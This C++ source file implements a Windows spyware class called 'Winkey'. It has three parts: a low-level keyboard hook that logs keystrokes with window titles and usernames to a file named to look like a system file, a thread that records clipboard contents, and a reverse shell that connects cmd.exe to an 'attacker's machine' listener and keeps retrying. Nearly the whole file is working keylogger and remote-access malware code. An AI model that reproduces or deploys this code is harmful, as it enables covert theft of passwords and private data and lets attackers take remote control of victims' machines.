#include "Winkey.hpp"

HHOOK hHock = NULL;
HWND currWindow;
HWND lastWindow = NULL;
bool shift_k = false;
char title[256];

FILE* file;

Winkey::Winkey(void)
{
	return;
}

Winkey::~Winkey(void)
{
	return;
}

void getTime(char** timebuff) {
	time_t ltime;
	struct tm  tstruct;
	char buff[80];
	ltime = time(0);
	tstruct = *localtime(&ltime);
	strftime(buff, sizeof(buff), "%d-%m-%Y %X", &tstruct);
	strcpy(*timebuff, buff);
}

// Define a mapping of virtual key codes to their string representations
const std::unordered_map<DWORD, std::string> keyMap = {
	{0x41, "A"}, {0x42, "B"}, {0x43, "C"}, {0x44, "D"}, {0x45, "E"}, {0x46, "F"}, {0x47, "G"}, {0x48, "H"}, {0x49, "I"}, {0x4A, "J"},
	{0x4B, "K"}, {0x4C, "L"}, {0x4D, "M"}, {0x4E, "N"}, {0x4F, "O"}, {0x50, "P"}, {0x51, "Q"}, {0x52, "R"}, {0x53, "S"}, {0x54, "T"},
	{0x55, "U"}, {0x56, "V"}, {0x57, "W"}, {0x58, "X"}, {0x59, "Y"}, {0x5A, "Z"},
	{VK_SLEEP, "[SLEEP]"},
	{VK_NUMPAD0, "0"}, {VK_NUMPAD1, "1"}, {VK_NUMPAD2, "2"}, {VK_NUMPAD3, "3"}, {VK_NUMPAD4, "4"}, {VK_NUMPAD5, "5"}, {VK_NUMPAD6, "6"},
	{VK_NUMPAD7, "7"}, {VK_NUMPAD8, "8"}, {VK_NUMPAD9, "9"}, {VK_MULTIPLY, "*"}, {VK_ADD, "+"}, {VK_SEPARATOR, "-"}, {VK_SUBTRACT, "-"},
	{VK_DECIMAL, "."}, {VK_DIVIDE, "/"},
	{VK_BACK, ""}, {VK_TAB, "\\t"}, {VK_RETURN, "\\n"}, {VK_SHIFT, "Shift"}, {VK_LCONTROL, "Ctrl+"}, {VK_RCONTROL, "Ctrl+"},
	{VK_SPACE, " "},
	{0x30, "1"}, {0x31, "2"}, {0x32, "3"}, {0x33, "4"}, {0x34, "5"}, {0x35, "6"}, {0x36, "7"}, {0x37, "8"}, {0x38, "9"}, {0x39, "0"},
	{VK_OEM_1, ";"}, {VK_OEM_PLUS, "+"}, {VK_OEM_COMMA, ","}, {VK_OEM_MINUS, "-"}, {VK_OEM_PERIOD, "."}, {VK_OEM_2, "/"},
	{VK_OEM_3, "`"}, {VK_OEM_4, "["}, {VK_OEM_5, "\\"}, {VK_OEM_6, "]"}, {VK_OEM_7, "'"}
	// Add more key mappings as needed
};

std::string HookCode(DWORD code, BOOL caps, BOOL shift)
{
    std::string key;
    auto it = keyMap.find(code);
    if (it != keyMap.end()) {
        key = it->second;
        if (caps && !shift) {
            // Convert to uppercase if Caps Lock is on and Shift is not pressed
            for (char& c : key) {
                c = static_cast<char>(std::toupper(static_cast<unsigned char>(c)));
            }
        }
        else if (shift && !caps) {
            // Convert to uppercase if Shift is pressed and Caps Lock is off
            for (char& c : key) {
                c = static_cast<char>(std::toupper(static_cast<unsigned char>(c)));
            }
        }
    }
    else {
        // Handle unknown key codes
        key = "[UNK-KEY]";
    }
    return key;
}

LRESULT CALLBACK KeyLogger(int nCode, WPARAM wParam, LPARAM lParam) {
    bool caps = false;
    int capsShort = GetKeyState(VK_CAPITAL);
    char* timebuf = (char*)malloc(sizeof(char) * 80);
	char	username[256];
	
	
	file = fopen("C:\\Windows\\WinNT.txt", "a");


    if (capsShort)
    {
        caps = TRUE;
    }
    std::string buffer;
    KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
    if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT) {
        if (wParam == WM_KEYDOWN)
        {
            shift_k = TRUE;
        }
        if (wParam == WM_KEYUP)
        {
            shift_k = FALSE;
        }
        else
        {
            shift_k = FALSE;
        }
    }
    if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)
    {
        currWindow = GetForegroundWindow();
        if (currWindow != lastWindow) {
            GetWindowText(currWindow, title, sizeof(title));
            DWORD userNameSize = sizeof(username);
			GetUserNameA(
				username,
                &userNameSize
			);
            getTime(&timebuf);
            buffer.clear();
            buffer.append("\n[ ");
            buffer.append(timebuf);
            buffer.append(" ] - ");
			buffer.append(username);
            buffer.append(" '");
            buffer.append(title);
            buffer.append("'\n");
            lastWindow = currWindow;
        }
        if (p->vkCode) {
            buffer.append(HookCode(p->vkCode, caps, shift_k));
        }
    }
    fprintf(file, "%s", buffer.data());
    fclose(file);
    buffer.clear();
    free(timebuf);

    return CallNextHookEx(hHock, nCode, wParam, lParam);
}

DWORD WINAPI _keyLogger(LPVOID lpParam)
{
	(void)lpParam;

    MSG msg;
    hHock = SetWindowsHookEx(WH_KEYBOARD_LL, KeyLogger, NULL, NULL);
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}

void	Winkey::startKeylogger(void)
{
    if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(_keyLogger), NULL, 0, NULL) == NULL) {
        std::cerr << "CreateThread failed!" << std::endl;
    }
	return;
}

DWORD WINAPI _clipboard(LPVOID lpParam)
{
    (void)lpParam;
    FILE* log = nullptr;
    HGLOBAL clip = nullptr;
    LPVOID str = nullptr;
    char* prevClipboardData = nullptr;



    while (true) {
        if (!OpenClipboard(0))
            return 0;
        // Check for clipboard changes at regular intervals (e.g., every second)


        clip = GetClipboardData(CF_TEXT);
        if (clip) {
            str = GlobalLock(clip);
            if (str) {
                // Check if clipboard data has changed
                if (prevClipboardData == nullptr || strcmp(static_cast<const char*>(str), prevClipboardData) != 0) {
                    // Data has changed, log it
                    fopen_s(&log, "C:\\Windows\\ClipBoard.txt", "a+");
                    if (log) {
                        fprintf_s(log, "\n{CLIPBOARD: %s}\n", str);
                        fclose(log);
                    }

                    // Update the previous clipboard data
                    if (prevClipboardData != nullptr) {
                        delete[] prevClipboardData;
                    }
                    prevClipboardData = new char[strlen(static_cast<const char*>(str)) + 1];
                    strcpy_s(prevClipboardData, strlen(static_cast<const char*>(str)) + 1, static_cast<const char*>(str));
                }
            }
            GlobalUnlock(clip);
        }
        CloseClipboard();
        Sleep(10000000);
    }

    // Cleanup (this part won't be reached in the loop)
    if (prevClipboardData != nullptr) {
        delete[] prevClipboardData;
    }

    return 0;
}

void    Winkey::startclipBoard(void)
{
    if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(_clipboard), NULL, 0, NULL) == NULL) {
        std::cerr << "CreateThread failed!" << std::endl;
    }
}

DWORD WINAPI _reverseShell(LPVOID lpParam)
{
    (void)lpParam;
    // listener ip, port on attacker's machine
    char* ip = "127.0.0.1";
    short port = 4444;

    WSADATA wsaData;
    SOCKET wSock;
    sockaddr_in hax;
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;

    while (true) {
        // Initialize Winsock
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            // Handle WSAStartup failure
            std::cerr << "WSAStartup failed!" << std::endl;
            Sleep(1000);  // Sleep before retrying
            continue;     // Retry the connection
        }

        // Create socket
        wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        if (wSock == INVALID_SOCKET) {
            //std::cerr << "Failed to create socket!" << std::endl;
            WSACleanup();
            Sleep(1000);  // Sleep before retrying
            continue;     // Retry the connection
        }

        hax.sin_family = AF_INET;
        hax.sin_port = htons(port);
        hax.sin_addr.s_addr = inet_addr(ip);

        // Connect to remote host
        if (WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            std::cerr << "Failed to connect to remote host!" << std::endl;
            closesocket(wSock);
            WSACleanup();
            Sleep(1000);  // Sleep before retrying
            continue;     // Retry the connection
        }

        memset(&sui, 0, sizeof(sui));
        sui.cb = sizeof(sui);
        sui.dwFlags = STARTF_USESTDHANDLES;
        sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;

        // Start cmd.exe with redirected streams
        if (CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi)) {
            // Wait for the shell process to exit
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        // Cleanup and retry after a delay
        closesocket(wSock);
        WSACleanup();
        Sleep(1000);  // Sleep before retrying
    }
}

void	Winkey::startReverseShell(void)
{
    if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(_reverseShell), NULL, 0, NULL) == NULL) {
        std::cerr << "CreateThread failed!" << std::endl;
    }
	return;
}